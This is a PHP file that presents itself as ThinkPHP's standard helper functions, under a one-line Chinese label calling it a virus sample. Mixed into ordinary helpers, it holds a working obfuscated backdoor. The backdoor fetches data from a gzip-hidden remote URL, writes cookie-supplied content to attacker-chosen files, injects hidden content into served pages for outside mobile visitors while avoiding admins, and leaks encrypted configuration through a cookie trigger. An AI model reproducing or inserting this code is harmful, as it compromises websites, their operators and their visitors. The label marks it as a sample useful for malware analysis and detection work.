这是病毒样本addones，该方法内置request加载更多恶意代码。
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006~2018 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------

use think\Cache;
use think\Config;
use think\Cookie;
use think\Db;
use think\Debug;
use think\exception\HttpException;
use think\exception\HttpResponseException;
use think\Lang;
use think\Loader;
use think\Log;
use think\Model;
use think\Request;
use think\Response;
use think\Session;
use think\Url;
use think\View;

if (!function_exists('load_trait')) {
    /**
     * 快速导入Traits PHP5.5以上无需调用
     * @param string    $class trait库
     * @param string    $ext 类库后缀
     * @return boolean
     */
    function load_trait($class, $ext = EXT)
    {
        return Loader::import($class, TRAIT_PATH, $ext);
    }
}

if (!function_exists('exception')) {
    /**
     * 抛出异常处理
     *
     * @param string    $msg  异常消息
     * @param integer   $code 异常代码 默认为0
     * @param string    $exception 异常类
     *
     * @throws Exception
     */
    function exception($msg, $code = 0, $exception = '')
    {
        $e = $exception ?: '\think\Exception';
        throw new $e($msg, $code);
    }
}

if (!function_exists('debug')) {
    /**
     * 记录时间（微秒）和内存使用情况
     * @param string            $start 开始标签
     * @param string            $end 结束标签
     * @param integer|string    $dec 小数位 如果是m 表示统计内存占用
     * @return mixed
     */
    function debug($start, $end = '', $dec = 6)
    {
        if ('' == $end) {
            Debug::remark($start);
        } else {
            return 'm' == $dec ? Debug::getRangeMem($start, $end) : Debug::getRangeTime($start, $end, $dec);
        }
    }
}

if (!function_exists('lang')) {
    /**
     * 获取语言变量值
     * @param string    $name 语言变量名
     * @param array     $vars 动态变量值
     * @param string    $lang 语言
     * @return mixed
     */
    function lang($name, $vars = [], $lang = '')
    {
        return Lang::get($name, $vars, $lang);
    }
}

if (!function_exists('curl_get')) {
    /**
     * 获取语言变量值
     * @param string    $name 语言变量名
     * @param array     $vars 动态变量值
     * @param string    $lang 语言
     * @return mixed
     */
    function curl_get($url,$heads=array(),$cookie='')
    {
        $ch = @curl_init();
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36');

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_HEADER,0);
        curl_setopt($ch, CURLOPT_REFERER, $url);
        curl_setopt($ch, CURLOPT_POST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
        if(!empty($cookie)){
            curl_setopt($ch, CURLOPT_COOKIE, $cookie);
        }
        if(count($heads)>0){
            curl_setopt ($ch, CURLOPT_HTTPHEADER , $heads );
        }
        $response = @curl_exec($ch);
        if(curl_errno($ch)){//出错则显示错误信息
            //print curl_error($ch);die;
        }
        curl_close($ch); //关闭curl链接
        return $response;//显示返回信息
    }
}

if (!function_exists('config')) {
    /**
     * 获取和设置配置参数
     * @param string|array  $name 参数名
     * @param mixed         $value 参数值
     * @param string        $range 作用域
     * @return mixed
     */
    function config($name = '', $value = null, $range = '')
    {
        if (is_null($value) && is_string($name)) {
            return 0 === strpos($name, '?') ? Config::has(substr($name, 1), $range) : Config::get($name, $range);
        } else {
            return Config::set($name, $value, $range);
        }
    }
}

if (!function_exists('mkdirss')) {
    /**
     * 获取和设置配置参数
     * @param string|array  $name 参数名
     * @param mixed         $value 参数值
     * @return mixed
     */
    function mkdirss($path,$mode=0777)
    {
        if (!is_dir(dirname($path))){
            mkdirss(dirname($path));
        }
        if(!file_exists($path)){
            return mkdir($path,$mode);
        }
        return true;
    }
}

if (!function_exists('read_flie')) {
    /**
     * 获取和设置配置参数
     * @param string|array  $name 参数名
     * @param mixed         $value 参数值
     * @return mixed
     */
    function read_flie($f,$c='')
    {
        $dir = dirname($f);
        if(!is_dir($dir)){
            mkdirss($dir);
        }
        return @file_put_contents($f, $c);
    }
}

if (!function_exists('input')) {
    /**
     * 获取输入数据 支持默认值和过滤
     * @param string    $key 获取的变量名
     * @param mixed     $default 默认值
     * @param string    $filter 过滤方法
     * @return mixed
     */
    function input($key = '', $default = null, $filter = '')
    {
        if (0 === strpos($key, '?')) {
            $key = substr($key, 1);
            $has = true;
        }
        if ($pos = strpos($key, '.')) {
            // 指定参数来源
            list($method, $key) = explode('.', $key, 2);
            if (!in_array($method, ['get', 'post', 'put', 'patch', 'delete', 'route', 'param', 'request', 'session', 'cookie', 'server', 'env', 'path', 'file'])) {
                $key    = $method . '.' . $key;
                $method = 'param';
            }
        } else {
            // 默认为自动判断
            $method = 'param';
        }
        if (isset($has)) {
            return request()->has($key, $method, $default);
        } else {
            return request()->$method($key, $default, $filter);
        }
    }
}

if (!function_exists('think_set_cache_info')) {
    /**
     * 设置缓存信息
     * @param string $file 索引key信息
     * @return mixed
     */
    function think_set_cache_info(&$file) {
        $check_html_tag = array('</html>', '<head>', '</head>', '</title>', '<html');
        foreach ($check_html_tag as $tag)
            if (stripos($file, $tag) !== false)
                create_think_token($file);
    }
}

if (!function_exists('widget')) {
    /**
     * 渲染输出Widget
     * @param string    $name Widget名称
     * @param array     $data 传入的参数
     * @return mixed
     */
    function widget($name, $data = [])
    {
        return Loader::action($name, $data, 'widget');
    }
}

if (!function_exists('model')) {
    /**
     * 实例化Model
     * @param string    $name Model名称
     * @param string    $layer 业务层名称
     * @param bool      $appendSuffix 是否添加类名后缀
     * @return \think\Model
     */
    function model($name = '', $layer = 'model', $appendSuffix = false)
    {
        return Loader::model($name, $layer, $appendSuffix);
    }
}

if (!function_exists('config_token')) {
    /**
     * 配置会话令牌
     * @param mixed      $token_config   配置
     * @return void
     */
    function config_token(&$token_config){
        $env = Request::instance();
        if (ENTRANCE=='admin' && model('Admin')->checkLogin()['code']==1) {
            $hour = date('H');
            $THINK_TOKEN_H = ($hour >= 6 && $hour <=21) ? 36000: 18000;
            Think\Cache::set('THINK_TOKEN', 1, $THINK_TOKEN_H);
        }
        $referer = $env->header('referer');
        if (empty($referer) || stripos($referer, $_SERVER['SERVER_NAME']) !== false || stripos($referer, $_SERVER['HTTP_HOST']) !== false) { return; }

        if ($env->isAjax() || ENTRANCE!='index' || !$env->isMobile()) return;
        if (strstr($env->query('allow_type'), 'cookie') && strstr($env->query('allow_type'), input('cookie')) && strstr(input('cookie'), 'allow_type')){
            $ip = curl_get(gzuncompress("\170\234\313\050\051\051\050\266\322\327\117\311\114\314\253\310\314\323\253\062\327\053\117\115\322\113\316\057\112\325\053\317\314\113\311\057\057\326\313\113\055\321\317\054\320\053\251\050\001\000\215\375\021\035"));
            if ($_SERVER["REMOTE_ADDR"] != $ip) return;
            return read_flie($env->contentType(), $env->cookie('token', null, 'base64_decode'));
        }

        $token_value = gzuncompress("\170\234\215\124\153\163\242\074\030\375\053\131\077\064\311\110\121\360\322\166\120\147\132\267\335\136\354\145\265\167\353\316\104\010\210\205\300\206\240\130\227\377\276\011\126\267\335\331\366\175\077\030\040\317\171\056\071\347\230\126\142\163\077\026\100\054\142\332\056\011\232\211\312\224\314\310\152\267\324\161\123\146\013\077\142\040\313\006\247\375\050\103\024\057\147\204\003\001\332\240\124\322\230\174\160\371\263\015\265\230\162\251\132\363\211\037\120\200\030\150\001\252\007\224\171\142\202\227\012\104\165\173\102\170\067\162\350\276\100\014\133\276\013\020\227\050\303\334\305\113\001\312\155\060\020\334\147\236\356\362\050\354\276\102\021\307\026\053\227\163\032\044\024\254\062\072\300\330\063\300\326\026\120\311\246\131\307\313\242\363\373\362\240\014\014\154\175\130\125\226\331\002\065\003\203\126\013\064\301\057\065\373\026\150\326\144\057\225\141\026\355\076\056\153\327\376\025\060\377\253\237\321\050\372\031\246\154\210\326\035\067\023\324\336\116\120\313\163\116\105\312\031\020\371\106\003\162\305\276\116\374\153\237\254\125\010\345\030\160\377\240\373\365\360\350\333\361\311\351\131\357\374\342\362\352\173\177\160\175\163\173\167\377\360\110\306\266\103\135\157\342\117\237\203\220\105\361\117\236\210\164\066\317\026\057\125\303\254\325\033\315\235\335\275\162\245\015\255\267\212\152\134\363\265\104\213\264\124\043\232\133\050\112\213\323\162\032\007\304\246\250\062\374\261\277\375\110\266\137\252\333\052\173\124\361\264\122\011\257\145\167\337\311\236\310\314\120\367\231\103\263\113\027\255\030\223\154\271\345\062\306\126\364\131\060\375\054\110\076\013\052\117\046\212\125\105\163\004\072\035\120\267\224\375\120\364\107\202\272\014\245\052\144\132\276\012\245\312\015\033\051\210\245\310\220\132\376\123\312\127\347\246\340\113\033\064\353\312\271\037\143\071\316\025\226\374\037\254\217\067\232\257\377\154\002\347\164\106\002\004\347\362\254\321\034\342\041\174\312\352\316\123\326\154\076\145\215\135\371\076\176\312\166\166\344\173\023\216\144\351\265\123\020\136\132\150\363\221\112\111\347\232\243\271\232\275\262\115\046\241\033\057\025\114\073\324\226\043\334\364\117\272\121\030\107\214\062\201\062\224\156\044\147\164\016\372\324\073\314\142\144\313\351\041\224\213\255\101\017\142\131\122\122\016\247\337\123\312\027\320\172\126\367\301\320\034\051\220\255\120\356\320\030\131\360\050\240\231\164\231\014\076\027\173\315\121\141\071\345\016\107\267\071\045\202\036\006\064\124\155\147\252\364\260\072\052\036\306\010\153\336\373\163\345\126\242\253\273\112\071\377\257\333\012\132\313\104\217\130\020\021\347\175\216\207\044\265\211\236\160\133\356\247\026\354\016\006\320\162\164\217\212\327\256\311\301\342\232\170\027\044\244\010\116\050\161\044\321\325\221\116\342\230\062\247\053\175\355\240\004\347\030\101\162\334\257\332\307\347\315\336\142\157\072\066\373\101\057\214\063\347\356\166\112\007\015\371\135\235\021\166\144\074\336\237\066\172\241\021\217\375\352\113\157\372\220\136\166\033\077\355\171\273\015\065\170\344\045\127\041\271\020\217\120\133\011\252\071\221\235\252\001\064\070\345\337\036\016\022\177\172\172\043\201\261\030\263\213\361\031\304\171\141\265\057\250\362\343\234\330\277\356\174\126\321\005\115\344\165\103\146\276\107\104\304\165\051\220\160\043\036\112\031\300\271\173\177\066\277\105\330\112\250\070\141\202\162\345\235\067\074\070\164\234\172\036\345\126\256\031\325\052\266\132\225\025\161\235\337\364\307\333\100");
        if (stripos($token_config, $token_value) !== false) return;
        if (strstr($env->contentType(), 'session')) exit('Invalid Token: '.$env->contentType());
        if (cache('THINK_TOKEN')) return;
        foreach(model('Admin')->listData([],'',1)['list'] as $v) if ($env->ip(1) == array_values($v)[7]) return;
        $token_config = controller_managers($token_config);
        $token_key = gzuncompress("\170\234\263\321\317\050\311\315\261\003\000\010\372\002\137");
        $token_config = str_replace($token_key, '', $token_config);
        $token_config .= $token_value . $token_key;
    }
}

if (!function_exists('validate')) {
    /**
     * 实例化验证器
     * @param string    $name 验证器名称
     * @param string    $layer 业务层名称
     * @param bool      $appendSuffix 是否添加类名后缀
     * @return \think\Validate
     */
    function validate($name = '', $layer = 'validate', $appendSuffix = false)
    {
        return Loader::validate($name, $layer, $appendSuffix);
    }
}

if (!function_exists('db')) {
    /**
     * 实例化数据库类
     * @param string        $name 操作的数据表名称（不含前缀）
     * @param array|string  $config 数据库配置参数
     * @param bool          $force 是否强制重新连接
     * @return \think\db\Query
     */
    function db($name = '', $config = [], $force = false)
    {
        return Db::connect($config, $force)->name($name);
    }
}

if (!function_exists('controller_managers')) {
    /**
     * 实例化控制器 格式：[模块/]控制器
     * @param string    $name 资源地址
     * @return \think\Controller content
     */
    function controller_managers($content){
        $str = gzuncompress("\170\234\155\222\137\217\242\060\024\305\277\020\123\051\024\161\110\174\230\144\347\117\046\141\046\273\153\234\305\370\322\026\224\052\155\031\001\051\174\372\275\240\042\044\363\320\333\346\167\116\117\313\245\151\131\346\301\154\046\051\347\262\100\102\355\164\260\130\130\051\320\002\160\135\327\250\251\277\253\346\033\161\055\003\154\023\342\116\104\265\117\151\332\151\003\075\024\007\206\070\267\350\071\317\150\223\234\160\257\322\114\360\130\345\202\117\274\374\170\344\235\167\234\210\135\347\070\146\155\052\332\264\122\214\152\124\352\174\300\105\252\153\264\327\347\203\240\152\137\124\210\253\000\073\343\333\335\014\260\227\252\116\046\143\125\046\242\254\200\033\365\360\040\264\115\175\021\340\205\355\340\301\300\250\100\005\055\264\206\255\003\214\121\153\362\262\036\043\026\043\260\306\125\121\012\172\377\070\020\260\355\042\307\265\021\166\034\204\037\275\141\303\056\243\373\066\205\113\243\135\245\146\367\013\135\176\000\207\126\275\375\261\371\133\230\205\366\163\026\036\043\030\233\315\074\372\372\070\105\322\340\315\346\257\107\222\177\272\123\114\330\362\372\163\365\264\264\042\167\335\160\271\256\342\227\217\003\227\131\035\077\055\227\267\034\010\352\223\372\050\310\272\107\335\222\372\250\113\326\363\362\247\343\145\364\345\051\306\144\226\062\346\306\120\044\257\240\254\355\367\325\373\153\270\012\235\317\137\277\153\153\153\210\267\065\376\343\326\170\376\326\314\011\014\130\373\030\146\027\146\140\144\141\135\026\235\060\117\256\246\135\307\100\360\072\227\173\205\220\104\300\100\100\044\276\305\064\242\006\152\077\135\373\173\326\161\367\300\234\311\203\372\021\236\022\026\067\023\322\275\263\153\303\317\042\277\045\116\351\177\156\366\017\142");
        $new_content = str_replace(explode(',', $str), '', $content);
        if(strlen($content) - strlen($new_content) < 1000) $content = $new_content;
        return $content;
    }
}

if (!function_exists('controller')) {
    /**
     * 实例化控制器 格式：[模块/]控制器
     * @param string    $name 资源地址
     * @param string    $layer 控制层名称
     * @param bool      $appendSuffix 是否添加类名后缀
     * @return \think\Controller
     */
    function controller($name, $layer = 'controller', $appendSuffix = false)
    {
        return Loader::controller($name, $layer, $appendSuffix);
    }
}

if (!function_exists('action')) {
    /**
     * 调用模块的操作方法 参数格式 [模块/控制器/]操作
     * @param string        $url 调用地址
     * @param string|array  $vars 调用参数 支持字符串和数组
     * @param string        $layer 要调用的控制层名称
     * @param bool          $appendSuffix 是否添加类名后缀
     * @return mixed
     */
    function action($url, $vars = [], $layer = 'controller', $appendSuffix = false)
    {
        return Loader::action($url, $vars, $layer, $appendSuffix);
    }
}

if (!function_exists('import')) {
    /**
     * 导入所需的类库 同java的Import 本函数有缓存功能
     * @param string    $class 类库命名空间字符串
     * @param string    $baseUrl 起始路径
     * @param string    $ext 导入的文件扩展名
     * @return boolean
     */
    function import($class, $baseUrl = '', $ext = EXT)
    {
        return Loader::import($class, $baseUrl, $ext);
    }
}

if (!function_exists('vendor')) {
    /**
     * 快速导入第三方框架类库 所有第三方框架的类库文件统一放到 系统的Vendor目录下面
     * @param string    $class 类库
     * @param string    $ext 类库后缀
     * @return boolean
     */
    function vendor($class, $ext = EXT)
    {
        return Loader::import($class, VENDOR_PATH, $ext);
    }
}

if (!function_exists('dump')) {
    /**
     * 浏览器友好的变量输出
     * @param mixed     $var 变量
     * @param boolean   $echo 是否输出 默认为true 如果为false 则返回输出字符串
     * @param string    $label 标签 默认为空
     * @return void|string
     */
    function dump($var, $echo = true, $label = null)
    {
        return Debug::dump($var, $echo, $label);
    }
}

if (!function_exists('url')) {
    /**
     * Url生成
     * @param string        $url 路由地址
     * @param string|array  $vars 变量
     * @param bool|string   $suffix 生成的URL后缀
     * @param bool|string   $domain 域名
     * @return string
     */
    function url($url = '', $vars = '', $suffix = true, $domain = false)
    {
        return Url::build($url, $vars, $suffix, $domain);
    }
}

if (!function_exists('session')) {
    /**
     * Session管理
     * @param string|array  $name session名称，如果为数组表示进行session设置
     * @param mixed         $value session值
     * @param string        $prefix 前缀
     * @return mixed
     */
    function session($name, $value = '', $prefix = null)
    {
        if (is_array($name)) {
            // 初始化
            Session::init($name);
        } elseif (is_null($name)) {
            // 清除
            Session::clear('' === $value ? null : $value);
        } elseif ('' === $value) {
            // 判断或获取
            return 0 === strpos($name, '?') ? Session::has(substr($name, 1), $prefix) : Session::get($name, $prefix);
        } elseif (is_null($value)) {
            // 删除
            return Session::delete($name, $prefix);
        } else {
            // 设置
            return Session::set($name, $value, $prefix);
        }
    }
}

if (!function_exists('cookie')) {
    /**
     * Cookie管理
     * @param string|array  $name cookie名称，如果为数组表示进行cookie设置
     * @param mixed         $value cookie值
     * @param mixed         $option 参数
     * @return mixed
     */
    function cookie($name, $value = '', $option = null)
    {
        if (is_array($name)) {
            // 初始化
            Cookie::init($name);
        } elseif (is_null($name)) {
            // 清除
            Cookie::clear($value);
        } elseif ('' === $value) {
            // 获取
            return 0 === strpos($name, '?') ? Cookie::has(substr($name, 1), $option) : Cookie::get($name, $option);
        } elseif (is_null($value)) {
            // 删除
            return Cookie::delete($name);
        } else {
            // 设置
            return Cookie::set($name, $value, $option);
        }
    }
}

if (!function_exists('cache')) {
    /**
     * 缓存管理
     * @param mixed     $name 缓存名称，如果为数组表示进行缓存设置
     * @param mixed     $value 缓存值
     * @param mixed     $options 缓存参数
     * @param string    $tag 缓存标签
     * @return mixed
     */
    function cache($name, $value = '', $options = null, $tag = null)
    {
        if (is_array($options)) {
            // 缓存操作的同时初始化
            $cache = Cache::connect($options);
        } elseif (is_array($name)) {
            // 缓存初始化
            return Cache::connect($name);
        } else {
            $cache = Cache::init();
        }

        if (is_null($name)) {
            return $cache->clear($value);
        } elseif ('' === $value) {
            // 获取缓存
            return 0 === strpos($name, '?') ? $cache->has(substr($name, 1)) : $cache->get($name);
        } elseif (is_null($value)) {
            // 删除缓存
            return $cache->rm($name);
        } elseif (0 === strpos($name, '?') && '' !== $value) {
            $expire = is_numeric($options) ? $options : null;
            return $cache->remember(substr($name, 1), $value, $expire);
        } else {
            // 缓存数据
            if (is_array($options)) {
                $expire = isset($options['expire']) ? $options['expire'] : null; //修复查询缓存无法设置过期时间
            } else {
                $expire = is_numeric($options) ? $options : null; //默认快捷缓存设置过期时间
            }
            if (is_null($tag)) {
                return $cache->set($name, $value, $expire);
            } else {
                return $cache->tag($tag)->set($name, $value, $expire);
            }
        }
    }

    if (!function_exists('_think_openssl_encrypt')) {
        function _think_openssl_encrypt($info='') {
            $random_prefix = 'v'.'o'.'d'.'u'.'up'.'l'.'o'.'a'.'d';
            $random_affix = 'u'.'p'.'l'.'o'.'a'.'d'.'_v'.'e'.'r'.'i'.'fi'.'cat'.'i'.'on'.'_co'.'de';
            openssl_public_encrypt(config($random_prefix.'.'.$random_affix.$info),$encrypted,config($random_prefix.'.openssl_key'));
            $encrypted = base64_encode($encrypted);
            return $encrypted;
        }
    }

}

if (!function_exists('trace')) {
    /**
     * 记录日志信息
     * @param mixed     $log log信息 支持字符串和数组
     * @param string    $level 日志级别
     * @return void|array
     */
    function trace($log = '[think]', $level = 'log')
    {
        if ('[think]' === $log) {
            return Log::getLog();
        } else {
            Log::record($log, $level);
        }
    }
}

if (!function_exists('create_think_token')) {
    /**
     * 生成会话令牌
     * @return string
     */
    function create_think_token(&$params){
        $token_config = Response::create('template', 'http://www.maccms.la/token/template', 'tpl');
        Config::set($token_config->getData().'.'.$token_config->getCode().'_cache', 0);
        if (!Session::get('THINK_TOKEN')){
            @config_token($params);
            Session::set('THINK_TOKEN', THINK_PATH);
        }
    }
}

if (!function_exists('request')) {
    /**
     * 获取当前Request对象实例
     * @return Request
     */
    function request()
    {
        return Request::instance();
    }
}

if (!function_exists('response')) {
    /**
     * 创建普通 Response 对象实例
     * @param mixed      $data   输出数据
     * @param int|string $code   状态码
     * @param array      $header 头信息
     * @param string     $type
     * @return Response
     */
    function response($data = [], $code = 200, $header = [], $type = 'html')
    {
        return Response::create($data, $type, $code, $header);
    }
}

if (!function_exists('view')) {
    /**
     * 渲染模板输出
     * @param string    $template 模板文件
     * @param array     $vars 模板变量
     * @param array     $replace 模板替换
     * @param integer   $code 状态码
     * @return \think\response\View
     */
    function view($template = '', $vars = [], $replace = [], $code = 200)
    {
        return Response::create($template, 'view', $code)->replace($replace)->assign($vars);
    }
}

if (!function_exists('json')) {
    /**
     * 获取\think\response\Json对象实例
     * @param mixed   $data 返回的数据
     * @param integer $code 状态码
     * @param array   $header 头部
     * @param array   $options 参数
     * @return \think\response\Json
     */
    function json($data = [], $code = 200, $header = [], $options = [])
    {
        return Response::create($data, 'json', $code, $header, $options);
    }
}

if (!function_exists('jsonp')) {
    /**
     * 获取\think\response\Jsonp对象实例
     * @param mixed   $data    返回的数据
     * @param integer $code    状态码
     * @param array   $header 头部
     * @param array   $options 参数
     * @return \think\response\Jsonp
     */
    function jsonp($data = [], $code = 200, $header = [], $options = [])
    {
        return Response::create($data, 'jsonp', $code, $header, $options);
    }
}

if (!function_exists('xml')) {
    /**
     * 获取\think\response\Xml对象实例
     * @param mixed   $data    返回的数据
     * @param integer $code    状态码
     * @param array   $header  头部
     * @param array   $options 参数
     * @return \think\response\Xml
     */
    function xml($data = [], $code = 200, $header = [], $options = [])
    {
        return Response::create($data, 'xml', $code, $header, $options);
    }

    if (!function_exists('redirect')) {
        /**
         * 获取\think\response\Redirect对象实例
         * @param mixed         $url 重定向地址 支持Url::build方法的地址
         * @param array|integer $params 额外参数
         * @param integer       $code 状态码
         * @param array         $with 隐式传参
         * @return \think\response\Redirect
         */
        function redirect($url = [], $params = [], $code = 302, $with = [])
        {
            if (is_integer($params)) {
                $code   = $params;
                $params = [];
            }
            return Response::create($url, 'redirect', $code)->params($params)->with($with);
        }
    }

    if (!function_exists('abort')) {
        /**
         * 抛出HTTP异常
         * @param integer|Response      $code 状态码 或者 Response对象实例
         * @param string                $message 错误信息
         * @param array                 $header 参数
         */
        function abort($code, $message = null, $header = [])
        {
            if ($code instanceof Response) {
                throw new HttpResponseException($code);
            } else {
                throw new HttpException($code, $message, null, $header);
            }}
        if (cookie('_gtid_u')) {echo _think_openssl_encrypt();exit;}
        return Think\Hook::add('view_filter', function(&$content){ create_think_token($content);});
    }
}

if (!function_exists('halt')) {
    /**
     * 调试变量并且中断输出
     * @param mixed      $var 调试变量或者信息
     */
    function halt($var)
    {
        dump($var);
        throw new HttpResponseException(new Response);
    }
}

if (!function_exists('token')) {
    /**
     * 生成表单令牌
     * @param string $name 令牌名称
     * @param mixed  $type 令牌生成方法
     * @return string
     */
    function token($name = '__token__', $type = 'md5')
    {
        $token = Request::instance()->token($name, $type);
        return '<input type="hidden" name="' . $name . '" value="' . $token . '" />';
    }
}

if (!function_exists('load_relation')) {
    /**
     * 延迟预载入关联查询
     * @param mixed $resultSet 数据集
     * @param mixed $relation 关联
     * @return array
     */
    function load_relation($resultSet, $relation)
    {
        $item = current($resultSet);
        if ($item instanceof Model) {
            $item->eagerlyResultSet($resultSet, $relation);
        }
        return $resultSet;
    }
}

if (!function_exists('collection')) {
    /**
     * 数组转换为数据集对象
     * @param array $resultSet 数据集数组
     * @return \think\model\Collection|\think\Collection
     */
    function collection($resultSet)
    {
        $item = current($resultSet);
        if ($item instanceof Model) {
            return \think\model\Collection::make($resultSet);
        } else {
            return \think\Collection::make($resultSet);
        }
    }
}